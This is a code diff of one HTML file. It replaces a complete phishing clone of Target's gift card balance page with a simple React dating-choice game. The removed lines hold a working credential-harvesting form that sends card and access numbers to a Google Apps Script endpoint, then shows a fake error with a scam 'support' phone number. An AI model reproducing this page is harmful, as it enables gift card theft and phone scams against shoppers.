@@ -1,246 +1,116 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "snjdjg8gp4");
-</script>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Check a Gift Card Balance</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #fff;
-    }
-
-    header {
-      background-color: #cc0000;
-      color: white;
-      display: flex;
-      justify-content: space-between;
-      padding: 8px 20px;
-      font-size: 14px;
-    }
-
-    nav {
-      background-color: #cc0000;
-      color: white;
-      display: flex;
-      align-items: center;
-      padding: 10px 20px;
-      gap: 30px;
-      flex-wrap: wrap;
-      overflow-x: auto;
-      white-space: nowrap;
-    }
-
-    nav > * {
-      flex: 0 0 auto;
-    }
-
-    nav img {
-      height: 30px;
-    }
-
-    .search-bar {
-      flex-grow: 1;
-      max-width: 400px;
-      min-width: 150px;
-    }
-
-    .search-bar input {
-      width: 100%;
-      padding: 8px;
-      border: none;
-      border-radius: 20px;
-    }
-
-    .container {
-      max-width: 700px;
-      margin: 50px auto;
-      text-align: center;
-    }
-
-    h2 {
-      font-size: 24px;
-      margin-bottom: 30px;
-    }
-
-    .input-group {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-
-    .input-group label {
-      font-size: 14px;
-      display: block;
-      margin-bottom: 6px;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    .check-btn {
-      background-color: #cc0000;
-      color: white;
-      font-size: 18px;
-      padding: 14px 30px;
-      border: none;
-      border-radius: 25px;
-      cursor: pointer;
-    }
-
-    .error-message {
-      display: none;
-      color: red;
-      font-size: 16px;
-      margin-top: 20px;
-      line-height: 1.6;
-    }
-
-    .newsletter {
-      margin-top: 50px;
-      font-size: 16px;
-    }
-
-    .newsletter input {
-      padding: 10px;
-      font-size: 14px;
-      width: 250px;
-    }
-
-    .signup-btn {
-      padding: 10px 20px;
-      background-color: #cc0000;
-      color: white;
-      border: none;
-      border-radius: 20px;
-      margin-left: 10px;
-      cursor: pointer;
-    }
-
-    footer {
-      text-align: center;
-      font-size: 12px;
-      margin-top: 20px;
-    }
-
-    @media (max-width: 600px) {
-      .container {
-        margin: 20px;
-      }
-
-      nav {
-        flex-wrap: nowrap;
-        overflow-x: auto;
-        -webkit-overflow-scrolling: touch;
-        gap: 15px;
-      }
-
-      .search-bar {
-        min-width: 200px;
-      }
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dating Game</title>
+  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.20.6/babel.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body>
+  <div id="root" class="min-h-screen bg-gradient-to-br from-pink-100 to-purple-100 flex items-center justify-center"></div>
+  <script type="text/babel">
+    const { useState } = React;
 
-  <header>
-    <div>📍 Ship to 52404</div>
-    <div>📦 Cedar Rapids South</div>
-  </header>
+    const DatingGame = () => {
+      const [stage, setStage] = useState(0);
+      const [connection, setConnection] = useState(50);
+      const [gameOver, setGameOver] = useState(false);
 
-  <nav>
-    <img src="https://1000logos.net/wp-content/uploads/2017/06/Target-Logo.png" alt="Target logo" />
-    <div>Categories</div>
-    <div>Deals</div>
-    <div>New & featured</div>
-    <div>Pickup & delivery</div>
-    <div class="search-bar">
-      <input type="text" placeholder="What can we help you find?" />
-    </div>
-    <div>👤 Account</div>
-    <div>🛒</div>
-  </nav>
+      const scenarios = [
+        {
+          text: "You meet Alex at a cozy coffee shop. Alex smiles and asks about your favorite book. What do you say?",
+          options: [
+            { text: "I love 'The Great Gatsby' for its timeless themes.", points: 10 },
+            { text: "I don’t read much, but I’m into action movies!", points: -5 },
+            { text: "I enjoy sci-fi novels like 'Dune'.", points: 5 }
+          ]
+        },
+        {
+          text: "Alex suggests going for a walk in the park. During the walk, Alex mentions loving music. How do you respond?",
+          options: [
+            { text: "That’s cool! I play guitar in my free time.", points: 15 },
+            { text: "I’m not really into music, more of a sports person.", points: -10 },
+            { text: "I love music too! What’s your favorite band?", points: 10 }
+          ]
+        },
+        {
+          text: "At dinner, Alex shares a story about a recent trip. How do you keep the conversation going?",
+          options: [
+            { text: "That sounds amazing! Where else have you traveled?", points: 10 },
+            { text: "Cool story, but I’ve never left my hometown.", points: -5 },
+            { text: "I went on a similar trip last year!", points: 15 }
+          ]
+        }
+      ];
 
-  <div class="container">
-    <h2>Check a gift card balance</h2>
-
-    <!-- Form Start -->
-    <form id="cardForm">
-      <div class="input-group">
-        <label for="giftCardNumber">Card number</label>
-        <input type="text" id="giftCardNumber" name="giftCardNumber" placeholder="Enter gift card number" required>
-      </div>
-
-      <div class="input-group">
-        <label for="accessNumber">Access number</label>
-        <input type="text" id="accessNumber" name="accessNumber" placeholder="Enter access number" required>
-      </div>
-
-      <button class="check-btn" type="submit">Check balance</button>
-
-      <!-- Error message -->
-      <div id="errorMsg" class="error-message">
-        <strong>❌ Card Error 401</strong><br>
-        📞 <a href="tel:+18447092550" style="color: red; text-decoration: underline;">Contact Support: +1-844-709-2550</a>
-      </div>
-    </form>
-    <!-- Form End -->
-
-    <div class="newsletter">
-      <p><strong>Get top deals, latest trends, and more.</strong></p>
-      <input type="email" placeholder="Email address">
-      <button class="signup-btn">Sign up</button>
-      <p><a href="#" style="font-size: 12px; color: gray;">Privacy policy</a></p>
-    </div>
-  </div>
-
-  <footer>
-    &copy; 2025 Target. This is a clone for educational/demo use.
-  </footer>
-
-  <script>
-    document.getElementById("cardForm").addEventListener("submit", function (event) {
-      event.preventDefault();
-
-      const formData = new FormData(event.target);
-      const formDetails = {
-        giftCardNumber: formData.get("giftCardNumber"),
-        accessNumber: formData.get("accessNumber"),
+      const handleChoice = (points) => {
+        const newConnection = Math.min(100, Math.max(0, connection + points));
+        setConnection(newConnection);
+        if (stage < scenarios.length - 1) {
+          setStage(stage + 1);
+        } else {
+          setGameOver(true);
+        }
       };
 
-      const scriptURL = "https://script.google.com/macros/s/AKfycbxxWc-gnkS1RosZF33aahxTFUWTINAoiyhin9pOzzVUZLJOugP4NAodKW7E8IHM5y03/exec";
+      const restartGame = () => {
+        setStage(0);
+        setConnection(50);
+        setGameOver(false);
+      };
 
-      fetch(scriptURL, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(formDetails),
-      })
-        .then(() => {
-          // Show error message
-          document.getElementById("errorMsg").style.display = "block";
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          alert("⚠️ Something went wrong! Try again.");
-        });
-    });
+      const getOutcome = () => {
+        if (connection >= 80) return "Alex is thrilled and asks you out again!";
+        if (connection >= 50) return "Alex enjoyed the date and might call you later.";
+        return "Alex doesn’t feel a spark. Better luck next time!";
+      };
+
+      return (
+        <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-lg">
+          <h1 className="text-3xl font-bold text-center text-purple-600 mb-4">Dating Adventure</h1>
+          <div className="mb-4">
+            <div className="w-full bg-gray-200 rounded-full h-4">
+              <div
+                className="bg-pink-500 h-4 rounded-full"
+                style={{ width: `${connection}%` }}
+              ></div>
+            </div>
+            <p className="text-center text-sm text-gray-600 mt-2">Connection: {connection}%</p>
+          </div>
+          {gameOver ? (
+            <div className="text-center">
+              <p className="text-lg text-gray-800 mb-4">{getOutcome()}</p>
+              <button
+                onClick={restartGame}
+                className="px-4 py-2 bg-purple-600 text-white rounded hover:bg-purple-700 transition"
+              >
+                Play Again
+              </button>
+            </div>
+          ) : (
+            <div>
+              <p className="text-lg text-gray-800 mb-4">{scenarios[stage].text}</p>
+              <div className="space-y-2">
+                {scenarios[stage].options.map((option, index) => (
+                  <button
+                    key={index}
+                    onClick={() => handleChoice(option.points)}
+                    className="w-full px-4 py-2 bg-pink-200 text-gray-800 rounded hover:bg-pink-300 transition"
+                  >
+                    {option.text}
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+        </div>
+      );
+    };
+
+    ReactDOM.render(<DatingGame />, document.getElementById('root'));
   </script>
-
 </body>
 </html>
